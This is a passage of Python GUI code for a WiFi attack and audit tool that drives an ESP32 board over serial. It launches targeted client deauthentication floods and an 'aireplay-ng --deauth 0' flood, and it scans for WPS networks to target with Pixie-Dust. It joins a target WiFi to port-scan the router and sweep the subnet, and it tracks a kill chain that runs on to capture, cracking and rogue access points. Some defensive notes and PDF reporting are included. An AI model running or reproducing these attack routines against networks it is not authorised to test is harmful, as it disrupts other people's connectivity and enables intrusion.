        t = self.tgt_var3.get()
        if t not in self.networks:
            self.deauth_log.insert("end","[!] Select a target network first\n"); return
        bssid, ch, _, _ = self.networks[t]
        client_mac = self._client_mac_var.get().strip().lower()
        # Validate MAC format
        import re
        if not re.match(r'^([0-9a-f]{2}:){5}[0-9a-f]{2}$', client_mac):
            self.deauth_log.insert("end","[!] Invalid client MAC — format: aa:bb:cc:dd:ee:ff\n")
            self._targeted_status.configure(text="Invalid MAC format", text_color=COLORS["red"])
            return
        cmd = f"CMD:DEAUTH_TARGETED:{bssid}:{ch}:{client_mac}"
        self.serial.send_cmd(cmd)
        self._targeted_status.configure(text=f"Targeting {client_mac}…", text_color=COLORS["purple"])
        self.deauth_log.insert("end", f"[*] Targeted unicast deauth → {client_mac}\n")
        self.deauth_log.insert("end", f"    AP: {bssid}  CH{ch}\n")
        self.deauth_log.insert("end", f"    Deauth+Disassoc unicast · 500 frames · 5ms gap\n")
        self.kc_update("DEAUTH", "running", f"Targeted → {client_mac}")



    def _aireplay_toggle(self):
        t = self.tgt_var3.get()
        if t not in self.networks:
            self.deauth_log.insert("end","[!] Select a target network first\n"); return
        iface = self.aireplay_iface.get().strip() or "wlan0mon"
        bssid, ch, _, _ = self.networks[t]
        if not self._aireplay_running:
            cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, iface]
            self.deauth_log.insert("end",
                f"[*] Kali deauth via aireplay-ng\n"
                f"    Interface : {iface}\n"
                f"    Target AP : {bssid}  CH{ch}\n"
                f"    Command   : {' '.join(cmd)}\n\n")
            self.deauth_log.see("end")
            try:
                self._aireplay_proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, bufsize=1)
                self._aireplay_running = True
                self.aireplay_btn.configure(text="■ Stop aireplay-ng", fg_color=COLORS["border"])
                self.aireplay_status.configure(text="🔴 DEAUTH FLOODING", text_color=COLORS["red"])
                self.kc_update("DEAUTH", "running", f"aireplay-ng → {bssid}")
                def _read():
                    for ln in self._aireplay_proc.stdout:
                        self.deauth_log.insert("end", ln)
                        self.deauth_log.see("end")
                    self.deauth_log.insert("end","[*] aireplay-ng stopped.\n")
                    self._aireplay_running = False
                    self.aireplay_btn.configure(text="▶ Start aireplay-ng", fg_color=COLORS["green"])
                    self.aireplay_status.configure(text="Status: Idle", text_color=COLORS["dim"])
                threading.Thread(target=_read, daemon=True).start()
            except FileNotFoundError:
                self.deauth_log.insert("end",
                    "[!] aireplay-ng not found.\n"
                    "    Run on Kali: sudo apt install aircrack-ng\n")
        else:
            if self._aireplay_proc:
                self._aireplay_proc.terminate()
                self._aireplay_proc = None
            self._aireplay_running = False
            self.aireplay_btn.configure(text="▶ Start aireplay-ng", fg_color=COLORS["green"])
            self.aireplay_status.configure(text="Stopped", text_color=COLORS["dim"])
            self.deauth_log.insert("end","[*] aireplay-ng terminated.\n")

    # ── Tab 4 : Full Router Audit (via TTGO) ──────────────────────────────────
    def _tab_config(self):
        f = self.tabs.tab("⚙️   4. Config & WPS Attacks")
        label(f, "CATEGORY: Router Audit & WPS — TTGO connects to target WiFi · Full port scan · PDF export",
              color=COLORS["yellow"], bold=True, size=13).pack(anchor="w", pady=(8,4), padx=10)

        row = ctk.CTkFrame(f, fg_color="transparent"); row.pack(fill="x", padx=4)

        # ── WPS card (left) ──
        c1 = card(row); c1.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c1, "WPS Network Scanner", color=COLORS["orange"], bold=True).pack(anchor="w", padx=10, pady=6)
        label(c1, "APs with WPS enabled are vulnerable to Pixie-Dust\n"
                  "(8-digit PIN brute-force, crackable in minutes).\n"
                  "Results appear below after a scan.",
              color=COLORS["dim"]).pack(anchor="w", padx=10)
        btn(c1, "▶ Scan for WPS APs", COLORS["orange"],
            lambda: self.serial.send_cmd("CMD:SCAN")).pack(padx=10, pady=8)
        self.wps_box = terminal(c1)
        self.wps_box.pack(fill="both", expand=True, padx=10, pady=6)

        # ── TTGO Router Audit card (right) ──
        c2 = card(row); c2.pack(side="left", fill="both", expand=True, padx=4, pady=4)
        label(c2, "📶 TTGO Router Audit", color=COLORS["red"], bold=True).pack(anchor="w", padx=10, pady=6)
        label(c2, "TTGO connects to the target WiFi then scans:\n"
                  "14 ports (FTP/SSH/Telnet/HTTP/UPnP/TR-069…)\n"
                  "+ HTTP banner grabbing + subnet host discovery.",
              color=COLORS["dim"]).pack(anchor="w", padx=10)

        fi = ctk.CTkFrame(c2, fg_color="transparent"); fi.pack(padx=10, pady=6, fill="x")
        self.audit_ssid = ctk.CTkEntry(fi, placeholder_text="Router SSID (target WiFi)")
        self.audit_ssid.pack(fill="x", pady=3)
        self.audit_pass = ctk.CTkEntry(fi, placeholder_text="WiFi Password", show="*")
        self.audit_pass.pack(fill="x", pady=3)

        # Fast / Deep toggle
        self.audit_mode_var = ctk.StringVar(value="FAST")
        mode_row = ctk.CTkFrame(c2, fg_color=COLORS["panel"], corner_radius=8)
        mode_row.pack(fill="x", padx=10, pady=4)
        label(mode_row, "Mode:", size=11, color=COLORS["dim"]).pack(side="left", padx=8)
        ctk.CTkRadioButton(
            mode_row, text="⚡ Fast (port scan only ~5s)",
            variable=self.audit_mode_var, value="FAST",
            text_color=COLORS["green"], fg_color=COLORS["green"]
        ).pack(side="left", padx=6, pady=6)
        ctk.CTkRadioButton(
            mode_row, text="🔬 Deep (+ subnet sweep ~40s)",
            variable=self.audit_mode_var, value="DEEP",
            text_color=COLORS["orange"], fg_color=COLORS["orange"]
        ).pack(side="left", padx=6, pady=6)

        btn_row = ctk.CTkFrame(c2, fg_color="transparent"); btn_row.pack(fill="x", padx=10, pady=4)
        btn(btn_row, "▶ Connect & Audit", COLORS["red"],  self._audit_router, width=150).pack(side="left", padx=4)
        btn(btn_row, "📄 Export PDF",    COLORS["purple"], self._audit_export_pdf, width=130).pack(side="left", padx=4)

        self.audit_status = label(c2, "Status: idle", color=COLORS["dim"], size=11)
        self.audit_status.pack(anchor="w", padx=10, pady=2)

        # Security grade badge (shown after audit completes)
        self._grade_badge = ctk.CTkLabel(
            c2, text="—",
            font=ctk.CTkFont(family="Courier", size=36, weight="bold"),
            text_color=COLORS["dim"])
        self._grade_badge.pack(anchor="w", padx=10, pady=(2,0))
        self._grade_label = label(c2, "", color=COLORS["dim"], size=10)
        self._grade_label.pack(anchor="w", padx=10)

        # Internal state for PDF
        self._audit_open_ports = []   # list of {port,service,banner,risk}
        self._audit_live_hosts = []   # list of IPs
        self._audit_gw        = ""
        self._audit_local_ip  = ""
        self._audit_scan_time = ""
        self._audit_findings  = {}

        # ── Bottom section: audit log (left) + device scanner (right) ──
        bot = ctk.CTkFrame(f, fg_color="transparent")
        bot.pack(fill="both", expand=True, padx=4, pady=(4, 0))

        # Audit log
        self.audit_box = terminal(bot)
        self.audit_box.pack(side="left", fill="both", expand=True, padx=(0, 3))

        # Device scanner panel
        dp = card(bot, width=255)
        dp.pack(side="left", fill="both", padx=(3, 0))
        dp.pack_propagate(False)

        label(dp, "🖥 Device Scanner", color=COLORS["blue"], bold=True).pack(anchor="w", padx=10, pady=(8, 2))
        label(dp, "Devices found in Deep scan.\nSelect one then scan its ports.",
              color=COLORS["dim"], size=10).pack(anchor="w", padx=10)

        self._device_var    = ctk.StringVar(value="")
        self._device_scroll = ctk.CTkScrollableFrame(dp, fg_color=COLORS["bg"], height=130)
        self._device_scroll.pack(fill="x", padx=6, pady=4)

        self._device_status = label(dp, "Run Deep scan first", color=COLORS["dim"], size=10)
        self._device_status.pack(anchor="w", padx=10, pady=2)

        btn(dp, "🔍 Scan Device Ports", COLORS["blue"],
            self._device_scan_start).pack(padx=8, pady=4, fill="x")

        self._device_box = terminal(dp)
        self._device_box.pack(fill="both", expand=True, padx=6, pady=(0, 6))

        label(f, "🛡 DEFENSE: Disable WPS · Disable Telnet/UPnP/TR-069 · Change default passwords · Update firmware",
              color=COLORS["green"], size=11).pack(anchor="w", padx=10, pady=4)

    def _audit_router(self):
        ssid = self.audit_ssid.get().strip()
        pw   = self.audit_pass.get().strip()
        if not ssid or not pw:
            self.audit_box.insert("end", "[!] Enter target SSID and password\n"); return
        # Reset state
        self._audit_open_ports = []
        self._audit_live_hosts = []
        self._audit_gw = ""
        self._audit_local_ip = ""
        self._audit_scan_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Clear device scanner
        for w in self._device_scroll.winfo_children():
            w.destroy()
        self._device_var.set("")
        self._device_box.delete("0.0", "end")
        self._device_status.configure(text="Waiting for Deep scan…", text_color=COLORS["dim"])
        self.audit_box.delete("0.0", "end")
        self.audit_box.insert("end", f"[*] Sending audit command to TTGO...\n"
                                      f"    SSID: {ssid}\n"
                                      f"    The TTGO will:\n"
                                      f"      1. Connect to {ssid}\n"
                                      f"      2. Scan 14 ports on the gateway\n"
                                      f"      3. Sweep subnet for live hosts\n\n")
        mode = self.audit_mode_var.get()   # "FAST" or "DEEP"
        self.serial.send_cmd(f"CMD:AUDIT:{ssid}:{pw}:{mode}")
        self.audit_status.configure(
            text=f"Status: {mode} audit via TTGO…",
            text_color=COLORS["green"] if mode == "FAST" else COLORS["orange"])
        self.kc_update("AUDIT", "running", f"TTGO {mode} audit: {ssid}")

    def _audit_log(self, msg):
        self.audit_box.insert("end", msg + "\n")
        self.audit_box.see("end")

    def _add_device_to_list(self, ip, tag=""):
        """Add a discovered host to the Device Scanner panel."""
        display = ip + (f"  [{tag}]" if tag else "")
        ctk.CTkRadioButton(
            self._device_scroll,
            text=display,
            variable=self._device_var,
            value=ip,
            text_color=COLORS["text"],
            fg_color=COLORS["blue"],
            font=ctk.CTkFont(family="Courier", size=11),
        ).pack(anchor="w", padx=4, pady=1)
        count = len(self._audit_live_hosts)
        self._device_status.configure(
            text=f"{count} device(s) found  → select & scan",
            text_color=COLORS["green"])
        # Auto-select the first device added
        if not self._device_var.get():
            self._device_var.set(ip)

    def _device_scan_start(self):
        ip = self._device_var.get()
        if not ip:
            self._device_box.insert("end", "[!] Select a device from the list first\n")
            return
        self._device_box.delete("0.0", "end")
        self._device_box.insert("end",
            f"[*] Scanning {ip}\n"
            f"    14 ports via TTGO...\n\n")
        self.serial.send_cmd(f"CMD:SCAN_DEVICE:{ip}")

    def _audit_export_pdf(self):
        if not self._audit_open_ports and not self._audit_live_hosts:
            self._audit_log("[!] Run an audit first (no data to export)."); return
        # Build findings dict for pdf generator
        nets = []
        for ssid, (bssid, ch, rssi, auth) in self.networks.items():
            a = int(auth) if auth.isdigit() else -1
            nets.append({"ssid": ssid, "bssid": bssid, "ch": ch, "rssi": rssi,
                         "security": ap_label(a), "risk": ap_risk(a)[0], "score": ap_score(a)})
        self._audit_findings = {
            "target": self._audit_gw, "gateway": self._audit_gw,
            "interface": "TTGO-ESP32", "local_ip": self._audit_local_ip,
            "scan_time": self._audit_scan_time,
            "open_ports": self._audit_open_ports,
            "live_hosts": self._audit_live_hosts,
            "networks": nets, "session_log": self.kc_timeline,
        }
        default = f"wifi_audit_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        path = filedialog.asksaveasfilename(
            defaultextension=".pdf", filetypes=[("PDF", "*.pdf")],
            initialfile=default, title="Save Audit Report")
        if not path: return
        self._audit_log(f"[*] Generating PDF: {path} ...")
        ok, result = ae.generate_pdf(path, self._audit_findings)
        if ok:
            self._audit_log(f"[+] PDF saved: {result}")
            try:
                subprocess.Popen(["xdg-open", result],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
        else:
            self._audit_log(f"[!] {result}")
            self._audit_log("    Fix: pip install fpdf2 --break-system-packages")

    # ── Tab 0 : Dashboard ───────────────────────────────────────────────────
    def _tab_dashboard(self):
        f = self.tabs.tab("🗺️   0. Dashboard")
        label(f, "LIVE NETWORK SECURITY DASHBOARD — Click any row to set as global target",
              color=COLORS["yellow"], bold=True, size=13).pack(anchor="w", pady=(8,4), padx=10)

        # Stats bar
        self._stats_bar = card(f); self._stats_bar.pack(fill="x", padx=4, pady=(0,4))
        self._stat_total  = label(self._stats_bar, "Networks: 0",   color=COLORS["blue"],   bold=True, size=12)
        self._stat_crit   = label(self._stats_bar, "Critical: 0",   color=COLORS["red"],    bold=True, size=12)
        self._stat_vuln   = label(self._stats_bar, "Vulnerable: 0", color=COLORS["orange"], bold=True, size=12)
        self._stat_secure = label(self._stats_bar, "Secure: 0",     color=COLORS["green"],  bold=True, size=12)
        for w in [self._stat_total, self._stat_crit, self._stat_vuln, self._stat_secure]:
            w.pack(side="left", padx=20, pady=6)
        btn(self._stats_bar, "▶ Scan", COLORS["blue"],
            lambda: self.serial.send_cmd("CMD:SCAN"), width=100).pack(side="right", padx=10)

        # Table header
        hdr = ctk.CTkFrame(f, fg_color=COLORS["border"]); hdr.pack(fill="x", padx=4)
        for txt, w in [("SSID",220),("BSSID",140),("CH",40),("RSSI",60),("SECURITY",90),("RISK",120),("SCORE",60),("TARGET",90)]:
            label(hdr, txt, color=COLORS["dim"], bold=True, size=11, width=w, anchor="w").pack(side="left", padx=4, pady=3)

        # Scrollable rows
        sf = ctk.CTkScrollableFrame(f, fg_color=COLORS["panel"])
        sf.pack(fill="both", expand=True, padx=4, pady=4)
        self._dash_frame = sf

    def _add_net_row(self, ssid, bssid, ch, rssi, auth_n, wps):
        if self._dash_frame is None: return
        score  = ap_score(auth_n, wps)
        risk, rcol = ap_risk(auth_n)
        sec    = ap_label(auth_n) + (" +WPS" if wps else "")
        scol   = ap_color(auth_n)
        bar    = "█" * (score // 10) + "░" * (10 - score // 10)

        if ssid in self.net_rows:
            r = self.net_rows[ssid]
            r["sec"].configure(text=sec, text_color=scol)
            r["risk"].configure(text=risk, text_color=rcol)
            r["score"].configure(text=f"{score:3d}  {bar}")
            r["rssi"].configure(text=rssi)
            return

        row = ctk.CTkFrame(self._dash_frame, fg_color=COLORS["card"],
                           border_color=COLORS["border"], border_width=1)
        row.pack(fill="x", padx=2, pady=2)
        s = ssid[:26] if len(ssid) > 26 else ssid
        label(row, s,    color=COLORS["text"],  size=11, width=220, anchor="w").pack(side="left", padx=4)
        label(row, bssid,color=COLORS["dim"],   size=11, width=140, anchor="w").pack(side="left", padx=2)
        label(row, ch,   color=COLORS["text"],  size=11, width=40,  anchor="w").pack(side="left", padx=2)
        rssi_lbl = label(row, rssi, color=COLORS["blue"], size=11, width=60, anchor="w"); rssi_lbl.pack(side="left", padx=2)
        sec_lbl  = label(row, sec,  color=scol,           size=11, width=90, anchor="w"); sec_lbl.pack(side="left", padx=2)
        risk_lbl = label(row, risk, color=rcol,           size=11, width=120, anchor="w"); risk_lbl.pack(side="left", padx=2)
        score_lbl= label(row, f"{score:3d}  {bar}", color=scol, size=10, width=160, anchor="w"); score_lbl.pack(side="left", padx=2)
        btn(row, "► Target", COLORS["purple"],
            lambda s=ssid: self._set_target_all(s), width=80).pack(side="left", padx=6)
        self.net_rows[ssid] = {"sec": sec_lbl, "risk": risk_lbl, "score": score_lbl, "rssi": rssi_lbl}

        # Update stats
        total = len(self.net_rows)
        crit  = sum(1 for ss in self.networks for n in [self.networks[ss]]
                    if n[3].isdigit() and int(n[3]) <= 1)
        vuln  = sum(1 for ss in self.networks for n in [self.networks[ss]]
                    if n[3].isdigit() and int(n[3]) <= 3)
        sec_c = total - vuln
        self._stat_total.configure(text=f"Networks: {total}")
        self._stat_crit.configure(text=f"Critical: {crit}")
        self._stat_vuln.configure(text=f"Vulnerable: {vuln}")
        self._stat_secure.configure(text=f"Secure: {sec_c}")

    # ── Tab 5 : Kill Chain ───────────────────────────────────────────────────
    def _tab_killchain(self):
        f = self.tabs.tab("⛓️   5. Kill Chain")
        label(f, "PENTEST KILL CHAIN — Live Attack Methodology Tracker",
              color=COLORS["yellow"], bold=True, size=13).pack(anchor="w", pady=(8,4), padx=10)

        # ─ Flow diagram canvas ─
        flow_frm = card(f); flow_frm.pack(fill="x", padx=4, pady=4)
        import tkinter as _tk
        cv = _tk.Canvas(flow_frm, bg="#111111", height=180, highlightthickness=0)
        cv.pack(fill="x", padx=4, pady=8)
        self._kc_canvas = cv

        # ─ Reset button ─
        btn(f, "↺ Reset Kill Chain", COLORS["border"], self._kc_reset, width=180).pack(anchor="e", padx=10)

        # ─ Gantt timeline ─
        label(f, "SESSION TIMELINE (GANTT)", color=COLORS["dim"], bold=True, size=11).pack(anchor="w", padx=10, pady=(8,0))
        gantt_frm = card(f); gantt_frm.pack(fill="both", expand=True, padx=4, pady=4)
        gcv = _tk.Canvas(gantt_frm, bg="#0a0a0a", height=220, highlightthickness=0)
        gcv.pack(fill="both", expand=True, padx=4, pady=4)
        self._gantt_canvas = gcv

        # Draw initial state after layout
        self.after(200, self._redraw_kc)
        self.after(200, self._redraw_gantt)

    # ── Kill chain engine ──────────────────────────────────────────────────────
    def kc_update(self, step_key, status, detail=""):
        """Update a kill chain step. status: pending/running/done/failed"""
        if step_key not in self.kc_status: return
        self.kc_status[step_key] = status
        ts = time.strftime("%H:%M:%S")
        self.kc_timeline.append((step_key, status, ts, detail))
        self._redraw_kc()
        self._redraw_gantt()

    def _kc_reset(self):
        self.kc_status   = {k: "pending" for k, _ in KC_STEPS}
        self.kc_timeline = []
        self._redraw_kc()
        self._redraw_gantt()

    def _redraw_kc(self):
        cv = self._kc_canvas
        if cv is None: return
        cv.delete("all")
        W = cv.winfo_width() or 1100

        # Layout: 4 boxes top row (L→R), 3 boxes bottom row (R→L) — U-shape
        BW, BH = 130, 60
        PAD    = 10
        step   = BW + PAD
        ROW1_Y = 20
        ROW2_Y = 108
        # Row 1: RECON TARGET DEAUTH CAPTURE  (indices 0-3)
        # Row 2: CRACK ROGUE AUDIT            (indices 4-6, drawn R→L aligned under CAPTURE)
        x0 = 20
        positions = {}
        for i, (key, _) in enumerate(KC_STEPS[:4]):
            positions[key] = (x0 + i * step, ROW1_Y)
        # Bottom row right-to-left starting under CAPTURE
        for i, (key, _) in enumerate(KC_STEPS[4:]):
            positions[key] = (x0 + (3 - i) * step, ROW2_Y)

        SC = {"pending":"#2a2a2a", "running":"#003388", "done":"#004422", "failed":"#440000"}
        TC = {"pending":"#555555", "running":"#4488ff", "done":"#00ff88", "failed":"#ff4444"}
        IC = {"pending":"○", "running":"●", "done":"✓", "failed":"✗"}

        for key, lbl in KC_STEPS:
            x, y = positions[key]
            st   = self.kc_status.get(key, "pending")
            cv.create_rectangle(x, y, x+BW, y+BH, fill=SC[st], outline=TC[st], width=2)
            cv.create_text(x+BW//2, y+20, text=IC[st]+" "+lbl,
                           fill=TC[st], font=("Courier", 10, "bold"))

        # Arrows row 1 (horizontal right)
        for i in range(3):
            k1, k2 = KC_STEPS[i][0], KC_STEPS[i+1][0]
            x1 = positions[k1][0] + BW; y1 = ROW1_Y + BH//2
            x2 = positions[k2][0];      y2 = y1
            cv.create_line(x1, y1, x2, y2, fill="#444", width=2, arrow="last")
        # Down arrow: CAPTURE → CRACK
        cx = positions["CAPTURE"][0] + BW//2
        cv.create_line(cx, ROW1_Y+BH, cx, ROW2_Y+BH//2, fill="#444", width=2, arrow="last")
        # Arrows row 2 (horizontal left)
        for i in range(4, 6):
            k1, k2 = KC_STEPS[i][0], KC_STEPS[i+1][0]
            x1 = positions[k1][0];      y1 = ROW2_Y + BH//2
            x2 = positions[k2][0] + BW; y2 = y1
            cv.create_line(x1, y1, x2, y2, fill="#444", width=2, arrow="last")

    def _redraw_gantt(self):
        gcv = self._gantt_canvas
        if gcv is None: return
        gcv.delete("all")
        W = gcv.winfo_width() or 1050
        H = 220
        ROW_H = 28
        LABEL_W = 90
        BAR_X   = LABEL_W + 10
        BAR_W   = W - BAR_X - 10

        SC = {"pending":"#2a2a2a", "running":"#003388", "done":"#004422", "failed":"#440000"}
        TC = {"pending":"#555",    "running":"#4488ff", "done":"#00ff88", "failed":"#ff4444"}

        # Header
        gcv.create_text(LABEL_W//2, 12, text="STEP", fill="#666", font=("Courier",9,"bold"))
        gcv.create_text(BAR_X + BAR_W//2, 12, text="─── TIMELINE ───", fill="#333", font=("Courier",9))

        # Build start times from timeline
        first_ts = {}; last_ts = {}
        for (key, st, ts_str, detail) in self.kc_timeline:
            h, m, s = [int(x) for x in ts_str.split(":")]
            secs = h*3600 + m*60 + s
            if key not in first_ts: first_ts[key] = secs
            last_ts[key] = secs

        t_min = min(first_ts.values()) if first_ts else 0
        t_max = max(last_ts.values())  if last_ts  else t_min + 60
        span  = max(t_max - t_min, 60)  # at least 60s window

        for i, (key, lbl) in enumerate(KC_STEPS):
            y = 26 + i * ROW_H
            st = self.kc_status.get(key, "pending")
            # Row background
            gcv.create_rectangle(LABEL_W, y, W-10, y+ROW_H-2, fill="#111", outline="#222")
            # Label
            gcv.create_text(LABEL_W-6, y+ROW_H//2, text=lbl, fill=TC[st],
                            font=("Courier",9,"bold"), anchor="e")
            # Bar
            if key in first_ts:
                bx1 = BAR_X + int((first_ts[key]-t_min)/span * BAR_W)
                bx2 = BAR_X + int((last_ts.get(key,first_ts[key])-t_min)/span * BAR_W) + 12
                bx2 = max(bx2, bx1 + 12)
                gcv.create_rectangle(bx1, y+4, bx2, y+ROW_H-6, fill=SC[st], outline=TC[st])
                # Time label
                records = [(s,d) for (k,_,s,d) in self.kc_timeline if k==key]
                if records:
                    ts_lbl = records[-1][0]
                    gcv.create_text(bx2+4, y+ROW_H//2, text=ts_lbl,
                                    fill=TC[st], font=("Courier",8), anchor="w")

    # ── Tab 6 : Serial Monitor ────────────────────────────────────────────────
    def _tab_serial_monitor(self):
        f = self.tabs.tab("📟  6. Serial Monitor")
        label(f, "RAW SERIAL MONITOR — every byte from TTGO, timestamped",
              color=COLORS["yellow"], bold=True, size=13).pack(anchor="w", pady=(8,4), padx=10)

        # Legend row
        leg = ctk.CTkFrame(f, fg_color="transparent"); leg.pack(anchor="w", padx=10, pady=2)
        for txt, col in [(" AUDIT ", "#00aaff"), (" DEAUTH ", "#ff4444"),
                         (" SCAN ", "#00ff88"), (" DEVICE ", "#ff9900"),
                         (" RAW ", "#aaaaaa"), (" IDF LOG ", "#553333"),
                         (" OTHER ", "#888888")]:
            ctk.CTkLabel(leg, text=txt, fg_color=col, text_color="#000000",
                         corner_radius=4, font=ctk.CTkFont(family="Courier", size=10, weight="bold"),
                         width=70).pack(side="left", padx=3)

        # Controls
        ctrl = ctk.CTkFrame(f, fg_color="transparent"); ctrl.pack(fill="x", padx=10, pady=4)
        self._serial_msg_count = ctk.CTkLabel(ctrl, text="Messages: 0",
                                              font=ctk.CTkFont(family="Courier", size=11),
                                              text_color=COLORS["dim"])
        self._serial_msg_count.pack(side="left", padx=8)
        btn(ctrl, "🗑 Clear", COLORS["panel"],
            lambda: [self._serial_box.delete("0.0", "end"),
                     self._serial_msg_count.configure(text="Messages: 0"),
                     setattr(self, "_serial_count", 0)],
            width=90).pack(side="left", padx=4)
        btn(ctrl, "💾 Save Log", COLORS["blue"], self._serial_save_log, width=110).pack(side="left", padx=4)

        # Filter: hide noisy ESP-IDF internal logs
        self._serial_hide_idf = False
        def _toggle_idf():
            self._serial_hide_idf = not self._serial_hide_idf
            hide_cb.configure(text="☑ Hide IDF logs" if self._serial_hide_idf else "☐ Hide IDF logs")
        hide_cb = ctk.CTkButton(ctrl, text="☐ Hide IDF logs", width=130,
                                fg_color="transparent", text_color=COLORS["dim"],
                                hover_color=COLORS["panel"], command=_toggle_idf,
                                font=ctk.CTkFont(family="Courier", size=11))
        hide_cb.pack(side="left", padx=8)

        # Terminal with color tags
        self._serial_box = ctk.CTkTextbox(
            f, font=ctk.CTkFont(family="Courier", size=11),
            fg_color="#080810", text_color="#cccccc", wrap="none")
        self._serial_box.pack(fill="both", expand=True, padx=10, pady=(0, 8))
        # Define color tags
        self._serial_box.tag_config("TS",     foreground="#444466")
        self._serial_box.tag_config("AUDIT",  foreground="#00aaff")
        self._serial_box.tag_config("DEAUTH", foreground="#ff4444")
        self._serial_box.tag_config("SCAN",   foreground="#00ff88")
        self._serial_box.tag_config("DEVICE", foreground="#ff9900")
        self._serial_box.tag_config("RAW",    foreground="#888888")
        self._serial_box.tag_config("IDFLOG", foreground="#553333")  # dim red — ESP-IDF internal
        self._serial_box.tag_config("OTHER",  foreground="#666666")
        self._serial_count = 0

    def _serial_log(self, ts, data):
        """Append a timestamped raw serial line to the monitor terminal."""
        import re
        # Detect ESP-IDF internal log lines: "E (12345) tag:message"
        _idf_log = bool(re.match(r'^[EIWDV] \(\d+\)', data))

        # Honour the "hide IDF logs" checkbox
        if _idf_log and getattr(self, "_serial_hide_idf", False):
            return

        # Determine color category
        if _idf_log:
            tag = "IDFLOG"
        elif data.startswith("RES:AUDIT") or data.startswith("RES:DEVICE"):
            tag = "AUDIT" if data.startswith("RES:AUDIT") else "DEVICE"
        elif data.startswith("RES:DEAUTH"):
            tag = "DEAUTH"
        elif data.startswith("RES:SCAN"):
            tag = "SCAN"
        elif data.startswith("RES:RAW"):
            tag = "RAW"
        else:
            tag = "OTHER"

        box = self._serial_box
        box.insert("end", f"[{ts}] ", "TS")
        box.insert("end", f"{data}\n", tag)
        box.see("end")

        self._serial_count += 1
        self._serial_msg_count.configure(text=f"Messages: {self._serial_count}")


    def _serial_save_log(self):
        """Save the serial monitor contents to a .log file."""
        import tkinter.filedialog as fd
        path = fd.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt")],
            initialfile=f"serial_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
            title="Save Serial Log")
        if path:
            content = self._serial_box.get("0.0", "end")
            with open(path, "w") as fh:
                fh.write(content)

    # ── Serial handler ────────────────────────────────────────────────────────


    def on_serial(self, data):
        # ── Feed raw serial monitor (always, before any routing) ──
        ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
        self._serial_log(ts, data)

        # Route output to correct log
        if data.startswith("RES:RAW:"):
            self._handle_raw(data[8:])
            return

        if data.startswith("RES:SCAN_AP:"):
            parts = data[12:].split("|")
            if len(parts) >= 5:
                ssid, bssid, ch, rssi, auth = parts[0],parts[1],parts[2],parts[3],parts[4]
                if ssid.strip():
                    self.networks[ssid] = (bssid, ch, rssi, auth)
                    self._update_all_dropdowns()
                    auth_n = int(auth) if auth.isdigit() else -1
                    wps = (auth_n <= 2)
                    wps_flag = "  [WPS?]" if wps else ""
                    self.wps_box.insert("end", f"{ssid:<25} {bssid}  CH{ch}  RSSI:{rssi}{wps_flag}\n")
                    self.wps_box.see("end")
                    self._add_net_row(ssid, bssid, ch, rssi, auth_n, wps)
                    self.kc_update("RECON", "done", f"Found {len(self.networks)} APs")

        elif data.startswith("RES:AUDIT"):
            # ── Route raw line to audit terminal ──
            self.audit_box.insert("end", f"{data}\n")
            self.audit_box.see("end")

            # ── AUDIT_IP:myip|gwip ──
            if data.startswith("RES:AUDIT_IP:"):
                parts = data[13:].split("|")
                if len(parts) == 2:
                    self._audit_local_ip, self._audit_gw = parts[0].strip(), parts[1].strip()
                    self.audit_status.configure(
                        text=f"Connected  GW:{self._audit_gw}",
                        text_color=COLORS["green"])

            # ── AUDIT_CONNECTING ──
            elif data.startswith("RES:AUDIT_CONNECTING:"):
                ssid = data[21:].strip()
                self.audit_status.configure(
                    text=f"Connecting to {ssid}…", text_color=COLORS["orange"])

            # ── AUDIT_PORTSCAN_START ──
            elif data.startswith("RES:AUDIT_PORTSCAN_START:"):
                gw = data[25:].strip()
                self.audit_box.insert("end",
                    f"\n[*] Scanning 14 ports on {gw}…\n")
                self.audit_box.see("end")

            # ── AUDIT_PORT:ip:port:OPEN:service:banner ──
            elif data.startswith("RES:AUDIT_PORT:"):
                p = data[15:].split(":")
                # p = [ip, port, OPEN, service, banner...]
                if len(p) >= 4 and p[2] == "OPEN":
                    port_n  = int(p[1]) if p[1].isdigit() else 0
                    service = p[3] if len(p) > 3 else "?"
                    banner  = ":".join(p[4:]).strip() if len(p) > 4 else ""
                    risk    = ("HIGH"   if port_n in {21,23,161,1900,7547,445,3389} else
                               "MEDIUM" if port_n in {22,80,3306,8080,8443,9090} else "LOW")
                    flag    = "🔴" if risk=="HIGH" else "🟡" if risk=="MEDIUM" else "🟢"
                    self.audit_box.insert("end",
                        f"  {flag} OPEN  {port_n:<6} {service:<14}  {banner[:50]}\n")
                    self.audit_box.see("end")
                    self._audit_open_ports.append({
                        "port": port_n, "service": service,
                        "banner": banner, "risk": risk})

            # ── AUDIT_SWEEP_PROGRESS:n/30 ──
            elif data.startswith("RES:AUDIT_SWEEP_PROGRESS:"):
                prog = data[25:].strip()
                self.audit_box.insert("end", f"  [sweeping hosts {prog}…]\n")
                self.audit_box.see("end")

            # ── AUDIT_SWEEP:ip:ALIVE|SELF ──

            elif data.startswith("RES:AUDIT_SWEEP:"):
                p = data[16:].split(":")
                if len(p) >= 2:
                    ip, status = p[0].strip(), p[1].strip()
                    gw_tag = "GATEWAY" if ip == self._audit_gw else \
                             "TTGO"    if ip == self._audit_local_ip else ""
                    arrow  = f" ← {gw_tag}" if gw_tag else ""
                    self.audit_box.insert("end", f"  ✅ {ip}{arrow}\n")
                    self.audit_box.see("end")
                    if ip not in self._audit_live_hosts:
                        self._audit_live_hosts.append(ip)
                        self._add_device_to_list(ip, gw_tag)

            # ── AUDIT_DONE ──
            elif data == "RES:AUDIT_DONE":
                n_ports = len(self._audit_open_ports)
                n_hosts = len(self._audit_live_hosts)
                high    = sum(1 for p in self._audit_open_ports if p["risk"] == "HIGH")
                # Calculate security grade
                sec = cve_db.calculate_security_score(self._audit_open_ports)
                grade_colors = {"A":"#00cc66","B":"#88cc00","C":"#ffcc00","D":"#ff8800","F":"#ff3333"}
                self._grade_badge.configure(
                    text=sec["grade"],
